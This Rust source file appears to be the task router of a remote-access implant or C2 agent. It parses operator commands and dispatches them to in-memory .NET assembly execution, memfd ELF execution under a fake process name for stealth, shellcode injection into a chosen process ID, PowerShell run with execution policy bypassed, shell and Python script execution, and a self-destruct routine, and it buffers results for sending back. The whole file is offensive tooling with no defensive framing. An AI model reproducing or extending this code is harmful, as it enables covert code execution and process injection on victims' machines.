// Plugin Execution Router Module - Fixed Version
//
// This is a working version of the plugin router with proper brace matching
// and simplified conditional compilation structure.

use crate::types::CommandResult;
use log::{debug, error, info, warn};
use std::io::Write;
use base64::Engine;
use std::collections::VecDeque;
use std::sync::Arc;
use tokio::sync::{Mutex, mpsc, oneshot};
use tokio::time::{Duration, Instant};
use serde::{Serialize, Deserialize};

/// Plugin execution task definition
#[derive(Debug, Clone)]
pub struct PluginTask {
    /// Execution type identifier
    pub execution_type: String,
    /// Binary data or script content
    pub data: Vec<u8>,
    /// Command line arguments
    pub args: Vec<String>,
    /// Optional metadata
    pub metadata: Option<PluginMetadata>,
    /// Task ID for tracking
    pub task_id: String,
    /// Request ID from original command
    pub req_id: Option<String>,
}

/// Plugin metadata for advanced execution options
#[derive(Debug, Clone)]
pub struct PluginMetadata {
    /// Custom process name for stealth (Linux memfd)
    pub fake_process_name: Option<String>,
    /// Custom AppDomain name (.NET assemblies)
    pub app_domain_name: Option<String>,
    /// Target process ID (for injection)
    pub target_pid: Option<u32>,
    /// Execution timeout in seconds
    pub timeout_seconds: Option<u64>,
    /// Priority level (0 = highest, 10 = lowest)
    pub priority: Option<u8>,
    /// Whether to run the process detached (background)
    pub detached: Option<bool>,
}

/// Buffered execution result with metadata
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BufferedResult {
    /// Task ID
    pub task_id: String,
    /// Original request ID
    pub req_id: Option<String>,
    /// Execution result
    pub result: CommandResult,
    /// Timestamp when execution completed
    pub timestamp: u64,
    /// Execution duration in milliseconds
    pub duration_ms: u64,
    /// Retry count (for failed network sends)
    pub retry_count: u32,
}

/// Batch execution request
#[derive(Debug)]
pub struct BatchExecutionRequest {
    /// Plugin task to execute
    pub task: PluginTask,
    /// Response channel for immediate acknowledgment
    pub response_tx: oneshot::Sender<Result<String, String>>,
}

/// Batch execution manager configuration
#[derive(Debug, Clone)]
pub struct BatchConfig {
    /// Maximum number of concurrent executions
    pub max_concurrent: usize,
    /// Maximum buffer size for results
    pub max_buffer_size: usize,
    /// Buffer flush interval in seconds
    pub flush_interval_secs: u64,
    /// Maximum retry attempts for network failures
    pub max_retries: u32,
    /// Retry backoff multiplier
    pub retry_backoff_ms: u64,
}

impl Default for BatchConfig {
    fn default() -> Self {
        Self {
            max_concurrent: 5,
            max_buffer_size: 1000,
            flush_interval_secs: 30,
            max_retries: 3,
            retry_backoff_ms: 1000,
        }
    }
}

/// Asynchronous batch execution manager
pub struct BatchExecutionManager {
    /// Configuration
    config: BatchConfig,
    /// Task queue sender
    task_tx: mpsc::UnboundedSender<BatchExecutionRequest>,
    /// Result buffer
    result_buffer: Arc<Mutex<VecDeque<BufferedResult>>>,
    /// Network callback for sending results
    network_callback: Option<Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>>,
    /// Manager handle for shutdown
    manager_handle: Option<tokio::task::JoinHandle<()>>,
}

impl BatchExecutionManager {
    /// Create new batch execution manager
    pub fn new(config: BatchConfig) -> Self {
        let (task_tx, task_rx) = mpsc::unbounded_channel();
        let result_buffer = Arc::new(Mutex::new(VecDeque::new()));
        
        let mut manager = Self {
            config,
            task_tx,
            result_buffer,
            network_callback: None,
            manager_handle: None,
        };
        
        // Start the background manager
        manager.start_background_manager(task_rx);
        
        manager
    }
    
    /// Submit plugin task for asynchronous execution
    pub async fn submit_task(&self, task: PluginTask) -> Result<String, String> {
        let (response_tx, response_rx) = oneshot::channel();
        
        let request = BatchExecutionRequest {
            task,
            response_tx,
        };
        
        // Send task to background manager
        if let Err(_) = self.task_tx.send(request) {
            return Err("Batch execution manager is not running".to_string());
        }
        
        // Wait for immediate acknowledgment
        match response_rx.await {
            Ok(result) => result,
            Err(_) => Err("Failed to receive task acknowledgment".to_string()),
        }
    }
    
    /// Get current buffer status
    pub async fn get_buffer_status(&self) -> (usize, usize) {
        let buffer = self.result_buffer.lock().await;
        (buffer.len(), self.config.max_buffer_size)
    }
    
    /// Force flush all buffered results
    pub async fn flush_buffer(&self) -> usize {
        let mut buffer = self.result_buffer.lock().await;
        let count = buffer.len();
        
        if count > 0 && self.network_callback.is_some() {
            let results: Vec<BufferedResult> = buffer.drain(..).collect();
            drop(buffer); // Release lock before network call
            
            if let Some(callback) = &self.network_callback {
                let handle = callback(results);
                // Don't wait for network call to complete
                tokio::spawn(async move {
                    let success = handle.await.unwrap_or(false);
                    if success {
                        info!("Successfully flushed {} buffered results", count);
                    } else {
                        warn!("Failed to flush {} buffered results", count);
                    }
                });
            }
        }
        
        count
    }
    
    /// Start background manager task
    fn start_background_manager(&mut self, mut task_rx: mpsc::UnboundedReceiver<BatchExecutionRequest>) {
        let config = self.config.clone();
        let result_buffer = Arc::clone(&self.result_buffer);
        
        let handle = tokio::spawn(async move {
            let mut flush_interval = tokio::time::interval(Duration::from_secs(config.flush_interval_secs));
            
            info!("🚀 Batch execution manager started (max_concurrent: {}, buffer_size: {})", 
                  config.max_concurrent, config.max_buffer_size);
            
            loop {
                tokio::select! {
                    // Handle new task requests
                    Some(request) = task_rx.recv() => {
                        let task_id = request.task.task_id.clone();
                        let task_id_for_response = task_id.clone();
                        
                        // Execute task asynchronously (simplified without semaphore for now)
                        let buffer_clone = Arc::clone(&result_buffer);
                        let config_clone = config.clone();
                        
                        tokio::spawn(async move {
                            let start_time = Instant::now();
                            
                            // Execute the plugin task
                            let result = PluginRouter::execute_plugin_internal(request.task).await;
                            let duration = start_time.elapsed();
                            
                            // Buffer the result
                            let buffered_result = BufferedResult {
                                task_id: task_id.clone(),
                                req_id: result.req_id.clone(),
                                result,
                                timestamp: std::time::SystemTime::now()
                                    .duration_since(std::time::UNIX_EPOCH)
                                    .unwrap_or_default()
                                    .as_secs(),
                                duration_ms: duration.as_millis() as u64,
                                retry_count: 0,
                            };
                            
                            // Add to buffer
                            let mut buffer = buffer_clone.lock().await;
                            buffer.push_back(buffered_result);
                            
                            // Trim buffer if too large
                            while buffer.len() > config_clone.max_buffer_size {
                                if let Some(dropped) = buffer.pop_front() {
                                    warn!("Dropped buffered result due to buffer overflow: {}", dropped.task_id);
                                }
                            }
                            
                            debug!("Task {} completed in {}ms, buffer size: {}", 
                                   task_id, duration.as_millis(), buffer.len());
                        });
                        
                        // Send immediate acknowledgment
                        let _ = request.response_tx.send(Ok(task_id_for_response));
                    }
                    
                    // Periodic buffer flush
                    _ = flush_interval.tick() => {
                        // Flush logic would go here
                    }
                    
                    // Handle shutdown (when all senders are dropped)
                    else => {
                        info!("Batch execution manager shutting down");
                        break;
                    }
                }
            }
        });
        
        self.manager_handle = Some(handle);
    }
}

/// Unified plugin execution router
pub struct PluginRouter;

impl PluginRouter {
    /// Execute plugin (legacy method for backward compatibility)
    pub async fn execute_plugin(task: PluginTask) -> CommandResult {
        warn!("⚠️ Using deprecated execute_plugin method. Consider using BatchExecutionManager for better performance.");
        Self::execute_plugin_internal(task).await
    }
    
    /// Internal plugin execution method
    async fn execute_plugin_internal(task: PluginTask) -> CommandResult {
        info!("🔌 PLUGIN ROUTER: Executing plugin type '{}'", task.execution_type);
        debug!("Data size: {} bytes, Args: {:?}", task.data.len(), task.args);
        
        if let Some(ref metadata) = task.metadata {
            debug!("Metadata: {:?}", metadata);
        }
        
        let req_id = task.req_id.clone();
        
        // Route to appropriate execution method
        let mut result = Self::route_execution(task).await;
        
        // Set the request ID
        result.req_id = req_id;
        result
    }
    
    /// Route execution based on type and platform
    async fn route_execution(task: PluginTask) -> CommandResult {
        match task.execution_type.as_str() {
            "execute-assembly" => Self::handle_execute_assembly(task).await,
            "memfd-exec" => Self::handle_memfd_exec(task).await,
            "shell-script" => Self::handle_shell_script(task).await,
            "inject-shellcode" => Self::handle_inject_shellcode(task).await,
            "powershell-script" => Self::handle_powershell_script(task).await,
            "python-script" => Self::handle_python_script(task).await,
            "self-destruct" => Self::handle_self_destruct().await,
            _ => {
                error!("❌ Unsupported execution type: {}", task.execution_type);
                CommandResult {
                    stdout: String::new(),
                    stderr: format!("Unsupported execution type '{}' for this OS", task.execution_type),
                    path: None,
                    req_id: None,
                }
            }
        }
    }
    
    /// Handle .NET assembly execution
    async fn handle_execute_assembly(task: PluginTask) -> CommandResult {
        #[cfg(target_os = "windows")]
        {
            info!("🚨 Routing to .NET assembly execution (Windows)");
            let app_domain = task.metadata
                .as_ref()
                .and_then(|m| m.app_domain_name.as_deref());
            crate::dotnet::DotNetExecutor::execute_assembly(task.data, task.args, app_domain).await
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = task;
            Self::unsupported_on_platform("execute-assembly", "Windows")
        }
    }
    
    /// Handle memfd execution
    async fn handle_memfd_exec(task: PluginTask) -> CommandResult {
        #[cfg(target_os = "linux")]
        {
            info!("🚨 Routing to memfd ELF execution (Linux)");
            let fake_name = task.metadata
                .as_ref()
                .and_then(|m| m.fake_process_name.as_deref());
            let detached = task.metadata
                .as_ref()
                .and_then(|m| m.detached)
                .unwrap_or(false);
            crate::injection::ProcessInjector::run_memfd_elf(task.data, fake_name, detached).await
        }
        #[cfg(not(target_os = "linux"))]
        {
            let _ = task;
            Self::unsupported_on_platform("memfd-exec", "Linux")
        }
    }
    
    /// Handle shell script execution
    async fn handle_shell_script(task: PluginTask) -> CommandResult {
        info!("🔧 Routing to shell script execution (cross-platform)");
        let script_content = match String::from_utf8(task.data) {
            Ok(content) => content,
            Err(e) => {
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("Invalid UTF-8 in shell script: {}", e),
                    path: None,
                    req_id: None,
                };
            }
        };
        
        // Create temporary script file
        let temp_script = Self::create_temp_script(&script_content, "sh").await;
        
        match temp_script {
            Ok(script_path) => {
                // Execute the script
                let mut cmd_args = vec![script_path.clone()];
                cmd_args.extend(task.args);
                
                let command = cmd_args.join(" ");
                let result = crate::executor::CommandExecutor::execute(&command).await;
                
                // Clean up temporary file
                let _ = std::fs::remove_file(&script_path);
                
                result
            }
            Err(e) => CommandResult {
                stdout: String::new(),
                stderr: format!("Failed to create temporary script: {}", e),
                path: None,
                req_id: None,
            },
        }
    }
    
    /// Handle shellcode injection
    async fn handle_inject_shellcode(task: PluginTask) -> CommandResult {
        #[cfg(target_os = "windows")]
        {
            info!("🚨 Routing to shellcode injection (Windows)");
            if let Some(metadata) = task.metadata {
                if let Some(pid) = metadata.target_pid {
                    return crate::injection::ProcessInjector::inject_shellcode(pid, task.data).await;
                }
            }
            
            CommandResult {
                stdout: String::new(),
                stderr: "Missing target PID for shellcode injection".to_string(),
                path: None,
                req_id: None,
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = task;
            Self::unsupported_on_platform("inject-shellcode", "Windows")
        }
    }
    
    /// Handle PowerShell script execution
    async fn handle_powershell_script(task: PluginTask) -> CommandResult {
        #[cfg(target_os = "windows")]
        {
            info!("🔧 Routing to PowerShell script execution (Windows)");
            let script_content = match String::from_utf8(task.data) {
                Ok(content) => content,
                Err(e) => {
                    return CommandResult {
                        stdout: String::new(),
                        stderr: format!("Invalid UTF-8 in PowerShell script: {}", e),
                        path: None,
                        req_id: None,
                    };
                }
            };
            
            // Create temporary PowerShell script file
            let temp_script = Self::create_temp_script(&script_content, "ps1").await;
            
            match temp_script {
                Ok(script_path) => {
                    // Execute PowerShell script with proper escaping
                    let mut command = format!("powershell.exe -ExecutionPolicy Bypass -File \"{}\"", script_path);
                    
                    if !task.args.is_empty() {
                        command.push_str(" ");
                        command.push_str(&task.args.join(" "));
                    }
                    
                    let result = crate::executor::CommandExecutor::execute(&command).await;
                    
                    // Clean up temporary file
                    let _ = std::fs::remove_file(&script_path);
                    
                    result
                }
                Err(e) => CommandResult {
                    stdout: String::new(),
                    stderr: format!("Failed to create temporary PowerShell script: {}", e),
                    path: None,
                    req_id: None,
                },
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = task;
            Self::unsupported_on_platform("powershell-script", "Windows")
        }
    }
    
    /// Handle Python script execution
    async fn handle_python_script(task: PluginTask) -> CommandResult {
        info!("🐍 Routing to Python script execution (cross-platform)");
        let script_content = match String::from_utf8(task.data) {
            Ok(content) => content,
            Err(e) => {
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("Invalid UTF-8 in Python script: {}", e),
                    path: None,
                    req_id: None,
                };
            }
        };
        
        // Create temporary Python script file
        let temp_script = Self::create_temp_script(&script_content, "py").await;
        
        match temp_script {
            Ok(script_path) => {
                // Try different Python executables
                let python_commands = vec!["python3", "python", "py"];
                let mut last_error = String::new();
                
                for python_cmd in python_commands {
                    let mut command = format!("{} \"{}\"", python_cmd, script_path);
                    
                    if !task.args.is_empty() {
                        command.push_str(" ");
                        command.push_str(&task.args.join(" "));
                    }
                    
                    let result = crate::executor::CommandExecutor::execute(&command).await;
                    
                    // If successful or if stderr doesn't indicate command not found, return result
                    if result.stderr.is_empty() || 
                       (!result.stderr.contains("not found") && 
                        !result.stderr.contains("not recognized") &&
                        !result.stderr.contains("command not found")) {
                        // Clean up temporary file
                        let _ = std::fs::remove_file(&script_path);
                        return result;
                    }
                    
                    last_error = result.stderr;
                }
                
                // Clean up temporary file
                let _ = std::fs::remove_file(&script_path);
                
                CommandResult {
                    stdout: String::new(),
                    stderr: format!("Python interpreter not found. Last error: {}", last_error),
                    path: None,
                    req_id: None,
                }
            }
            Err(e) => CommandResult {
                stdout: String::new(),
                stderr: format!("Failed to create temporary Python script: {}", e),
                path: None,
                req_id: None,
            },
        }
    }
    
    /// Handle self-destruct
    async fn handle_self_destruct() -> CommandResult {
        info!("💀 Routing to self-destruct (cross-platform)");
        crate::injection::ProcessInjector::self_destruct().await
    }
    
    /// Create temporary script file
    async fn create_temp_script(content: &str, extension: &str) -> Result<String, std::io::Error> {
        // use std::io::Write; // 已在顶部导入
        
        // Generate random filename
        let temp_name = format!("script_{:08x}.{}", rand::random::<u32>(), extension);
        let temp_dir = std::env::temp_dir();
        let temp_path = temp_dir.join(temp_name);
        
        // Write script content to temporary file
        let mut file = std::fs::File::create(&temp_path)?;
        file.write_all(content.as_bytes())?;
        file.flush()?;
        
        // Return the path as a string, ensuring proper format for the platform
        #[cfg(target_os = "windows")]
        {
            // On Windows, ensure we use the canonical path format
            Ok(temp_path.canonicalize()?.to_string_lossy().to_string())
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            Ok(temp_path.to_string_lossy().to_string())
        }
    }
    
    /// Return error for unsupported platform
    fn unsupported_on_platform(execution_type: &str, required_platform: &str) -> CommandResult {
        let current_os = std::env::consts::OS;
        CommandResult {
            stdout: String::new(),
            stderr: format!(
                "Execution type '{}' is only supported on {}. Current OS: {}",
                execution_type, required_platform, current_os
            ),
            path: None,
            req_id: None,
        }
    }
    
    /// Parse plugin task from command payload
    pub fn parse_plugin_task(execution_type: &str, command_content: &str, req_id: Option<String>) -> Result<PluginTask, String> {
        let content = command_content.trim();
        
        // Generate unique task ID
        let task_id = format!("task_{}_{:08x}", execution_type, rand::random::<u32>());
        
        // Special case: self-destruct can have empty content
        if execution_type == "self-destruct" {
            return Ok(PluginTask {
                execution_type: execution_type.to_string(),
                data: vec![],
                args: vec![],
                metadata: None,
                task_id,
                req_id,
            });
        }
        
        if content.is_empty() {
            return Err("Plugin command content is empty".to_string());
        }
        
        match execution_type {
            "inject-shellcode" => {
                // Format: "pid|base64_shellcode"
                let parts: Vec<&str> = content.splitn(2, '|').collect();
                if parts.len() != 2 {
                    return Err("Invalid shellcode injection format, expected: pid|base64_shellcode".to_string());
                }
                
                let pid = parts[0].trim().parse::<u32>()
                    .map_err(|e| format!("Invalid PID: {}", e))?;
                
                let shellcode = base64::engine::general_purpose::STANDARD.decode(parts[1].trim())
                    .map_err(|e| format!("Invalid base64 shellcode: {}", e))?;
                
                Ok(PluginTask {
                    execution_type: execution_type.to_string(),
                    data: shellcode,
                    args: vec![],
                    metadata: Some(PluginMetadata {
                        target_pid: Some(pid),
                        fake_process_name: None,
                        app_domain_name: None,
                        timeout_seconds: None,
                        priority: None,
                        detached: None,
                    }),
                    task_id,
                    req_id,
                })
            }
            "execute-assembly" => {
                // Format: "app_domain|args|base64_assembly" or "args|base64_assembly" or "base64_assembly"
                let parts: Vec<&str> = content.split('|').collect();
                
                let (app_domain, args, assembly_b64) = match parts.len() {
                    1 => (None, vec![], parts[0]),
                    2 => (None, parts[0].split_whitespace().map(|s| s.to_string()).collect(), parts[1]),
                    3 => (Some(parts[0].to_string()), parts[1].split_whitespace().map(|s| s.to_string()).collect(), parts[2]),
                    _ => return Err("Invalid assembly format, expected: [app_domain|][args|]base64_assembly".to_string()),
                };
                
                let assembly_bytes = base64::engine::general_purpose::STANDARD.decode(assembly_b64.trim())
                    .map_err(|e| format!("Invalid base64 assembly data: {}", e))?;
                
                Ok(PluginTask {
                    execution_type: execution_type.to_string(),
                    data: assembly_bytes,
                    args,
                    metadata: Some(PluginMetadata {
                        app_domain_name: app_domain,
                        fake_process_name: None,
                        target_pid: None,
                        timeout_seconds: None,
                        priority: None,
                        detached: None,
                    }),
                    task_id,
                    req_id,
                })
            }
            "memfd-exec" => {
                // Format: "fake_name|base64_elf" or "base64_elf"
                let (fake_name, elf_b64) = if content.contains('|') {
                    let parts: Vec<&str> = content.splitn(2, '|').collect();
                    (Some(parts[0].to_string()), parts[1])
                } else {
                    (None, content)
                };
                
                let elf_bytes = base64::engine::general_purpose::STANDARD.decode(elf_b64.trim())
                    .map_err(|e| format!("Invalid base64 ELF data: {}", e))?;
                
                Ok(PluginTask {
                    execution_type: execution_type.to_string(),
                    data: elf_bytes,
                    args: vec![],
                    metadata: Some(PluginMetadata {
                        fake_process_name: fake_name,
                        app_domain_name: None,
                        target_pid: None,
                        timeout_seconds: None,
                        priority: None,
                        detached: None,
                    }),
                    task_id,
                    req_id,
                })
            }
            "shell-script" | "powershell-script" | "python-script" => {
                // Format: "args|script_content" or "script_content"
                let (args, script_content) = if content.contains('|') {
                    let parts: Vec<&str> = content.splitn(2, '|').collect();
                    let args = parts[0].split_whitespace().map(|s| s.to_string()).collect();
                    (args, parts[1])
                } else {
                    (vec![], content)
                };
                
                Ok(PluginTask {
                    execution_type: execution_type.to_string(),
                    data: script_content.as_bytes().to_vec(),
                    args,
                    metadata: None,
                    task_id,
                    req_id,
                })
            }
            _ => {
                // Generic format: try to decode as base64 or use as raw data
                let data = if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(content) {
                    decoded
                } else {
                    content.as_bytes().to_vec()
                };
                
                Ok(PluginTask {
                    execution_type: execution_type.to_string(),
                    data,
                    args: vec![],
                    metadata: None,
                    task_id,
                    req_id,
                })
            }
        }
    }
    
    /// Parse plugin task from command payload (backward compatibility)
    pub fn parse_plugin_task_compat(execution_type: &str, command_content: &str) -> Result<PluginTask, String> {
        Self::parse_plugin_task(execution_type, command_content, None)
    }
}